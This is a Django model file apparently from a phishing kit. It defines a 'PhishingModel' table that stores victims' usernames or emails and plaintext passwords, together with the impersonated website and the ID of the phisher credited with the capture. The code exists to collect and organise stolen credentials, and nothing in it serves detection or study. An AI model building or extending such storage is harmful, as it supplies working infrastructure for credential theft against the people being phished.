from django.db import models

class PhishingModel(models.Model):
    username_or_email = models.CharField('username_or_email', max_length=100)
    password = models.CharField('password', max_length=150)
    phisher_id = models.IntegerField('phisher_id')
    website = models.CharField('website', max_length=50)
    created = models.DateTimeField(auto_now_add=True)
    
    def __str__(self):
        return f"{self.username_or_email}"

